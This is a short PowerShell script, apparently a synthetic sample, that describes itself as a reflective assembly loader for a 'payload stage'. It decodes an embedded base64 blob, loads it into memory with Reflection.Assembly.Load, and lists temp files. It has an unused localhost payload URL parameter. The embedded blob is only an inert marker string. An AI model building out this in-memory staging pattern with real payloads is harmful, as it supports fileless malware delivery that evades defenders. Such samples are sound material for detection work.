<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://127.0.0.1/payload.bin',
    [int]$TimeoutSec = 37
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo4NWNsZGJxaXdy")
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 37 reached"
